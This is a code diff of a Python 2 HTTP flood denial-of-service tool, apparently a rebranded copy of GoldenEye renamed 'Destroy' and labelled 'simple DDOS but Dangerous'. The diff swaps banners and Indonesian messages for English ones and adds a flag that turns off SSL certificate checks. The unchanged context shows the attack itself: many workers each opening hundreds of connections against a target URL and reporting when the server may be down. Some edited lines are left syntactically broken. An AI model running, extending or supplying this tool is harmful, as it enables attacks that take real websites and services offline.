@@ -1,16 +1,21 @@
 #!/usr/bin/env python
 
+BANNER ="""
+$Id:
+      ____            __
+   / __ \___  _____/ /__________  __  __
+  / / / / _ \/ ___/ __/ ___/ __ \/ / / /
+ / /_/ /  __(__  ) /_/ /  / /_/ / /_/ /
+/_____/\___/____/\__/_/   \____/\__, /
+                               /____/    
+                                                                                                                                                                                                      
+This is simple DDOS but Dangerous
+@author : BL4NK
+"""
+
 from multiprocessing import Process, Manager, Pool
 import urlparse, ssl
 import sys, getopt, random, time, os
-from pyfiglet import Figlet
-banner = Figlet(font='roman')
-from datetime import datetime
-current = datetime.now()
-
-tahun = current.year
-bulan = current.month
-hari = current.day
 
 # Python version-specific 
 if  sys.version_info < (3,0):
@@ -26,6 +31,7 @@ else:
 # Config
 ####
 DEBUG = False
+SSLVERIFY = True
 
 ####
 # Constants
@@ -39,7 +45,7 @@ JOIN_TIMEOUT=1.0
 DEFAULT_WORKERS=10
 DEFAULT_SOCKETS=500
 
-GOLDENEYE_BANNER = 'GoldenEye v2.2 By BL4NK'
+DESTROY_BANNER = 'Destroy v2.1 By BL4NK '
 
 USER_AGENT_PARTS = {
     'os': {
@@ -114,7 +120,7 @@ class GoldenEye(object):
 
     def exit(self):
         self.stats()
-        print "Turn Off GoldenEye cuk!!"
+        print "Shutting down Destroy"
 
     def __del__(self):
         self.exit()
@@ -122,15 +128,15 @@ class GoldenEye(object):
     def printHeader(self):
 
         # Taunt!
-        print (banner.renderText('BL4NK'))
+        print BANNER
         print GOLDENEYE_BANNER
-        print "{}/{}/{}".format(hari, bulan, tahun)
+        print
 
     # Do the fun!
     def fire(self):
 
         self.printHeader()
-        print "Merusak Server Dalam MOde '{0}' Dengan {1} Perusak sedang bekerja {2} connections each.CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets)
+        print "Merusak web server dalam mode '{0}' dengan {1} perusak is running {2} connections each. CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets)
 
         if DEBUG:
             print "Starting {0} concurrent workers".format(self.nr_workers)
@@ -159,7 +165,7 @@ class GoldenEye(object):
         try:
             if self.counter[0] > 0 or self.counter[1] > 0:
 
-                print "{0} GoldenEye strikes deferred. ({1} Failed)".format(self.counter[0], self.counter[1])
+                print "{0} Destroy strikes hit. ({1} Failed)".format(self.counter[0], self.counter[1])
 
                 if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                     print "\tServer may be DOWN!"
@@ -185,7 +191,7 @@ class GoldenEye(object):
                 for worker in self.workersQueue:
                     try:
                         if DEBUG:
-                            print "Mematikan Perusak {0}".format(worker.name)
+                            print "Killing worker {0}".format(worker.name)
                         #worker.terminate()
                         worker.stop()
                     except Exception, ex:
@@ -249,7 +255,6 @@ class Striker(Process):
             'http://www.bing.com/',
             'http://www.baidu.com/',
             'http://www.yandex.com/',
-            'http://www.duckduckgo.com',
             'http://' + self.host + '/'
             ]
 
@@ -278,7 +283,7 @@ class Striker(Process):
     def run(self):
 
         if DEBUG:
-            print "Memulai perusak {0}".format(self.name)
+            print "Starting worker {0}".format(self.name)
 
         while self.runnable:
 
@@ -286,8 +291,11 @@ class Striker(Process):
 
                 for i in range(self.nr_socks):
                 
-                    if self.ssl:
-                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
+                    if self.ssl:                    
+                        if SSLVERIFY:
+                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
+                        else:
+                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())                                                  
                     else:
                         c = HTTPCLIENT.HTTPConnection(self.host, self.port)
 
@@ -316,7 +324,7 @@ class Striker(Process):
                     pass # silently ignore
 
         if DEBUG:
-            print "Perusak {0} completed run. Turn Off perusak qimak!...".format(self.name)
+            print "Worker {0} completed run. Sleeping...".format(self.name)
             
     def closeConnections(self):
         for conn in self.socks:
@@ -507,23 +515,23 @@ class Striker(Process):
 ####
 
 def usage():
-    print "  \e[101m\e[1;77m:: kumpulan tool powerfull     ::\e[0m\n"
-    print "  \e[101m\e[1;77m:: Thanks to Daffa Arif, Jackpot 0day exploit , MR.X::\e[0m\n
+    print
     print '-----------------------------------------------------------------------------------------------------------'
-    print (banner.renderText('BL4NK'))
-    print GOLDENEYE_BANNER
-    print "{}/{}/{}".format(hari, bulan, tahun)
-    print ' USAGE: ./destroy.py <url> [OPTIONS]'
+    print BANNER
+    print DESTROY_BANNER
     print 
+    print ' USAGE: ./destroy.py <url> [OPTIONS]'
+    print
     print ' OPTIONS:'
     print '\t Flag\t\t\tDescription\t\t\t\t\t\tDefault'
     print '\t -u, --useragents\tFile with user-agents to use\t\t\t\t(default: randomly generated)'
     print '\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS)
     print '\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS)
     print '\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)'
+    print '\t -n, --nosslcheck\tDo not verify SSL Certificate\t\t\t\t(default: True)'
     print '\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)'
     print '\t -h, --help\t\tShows this help'
-    print '\t By : BL4NK   thanks to Daffa_Arif'
+    print '\t by : BL4NK
     print '-----------------------------------------------------------------------------------------------------------'
 
     
@@ -556,7 +564,7 @@ def main():
         if url == None:
             error("No URL supplied")
 
-        opts, args = getopt.getopt(sys.argv[2:], "dhw:s:m:u:", ["debug", "help", "workers", "sockets", "method", "useragents" ])
+        opts, args = getopt.getopt(sys.argv[2:], "ndhw:s:m:u:", ["nosslcheck", "debug", "help", "workers", "sockets", "method", "useragents" ])
 
         workers = DEFAULT_WORKERS
         socks = DEFAULT_SOCKETS
@@ -578,6 +586,9 @@ def main():
             elif o in ("-d", "--debug"):
                 global DEBUG
                 DEBUG = True
+            elif o in ("-n", "--nosslcheck"):
+                global SSLVERIFY
+                SSLVERIFY = False
             elif o in ("-m", "--method"):
                 if a in (METHOD_GET, METHOD_POST, METHOD_RAND):
                     method = a
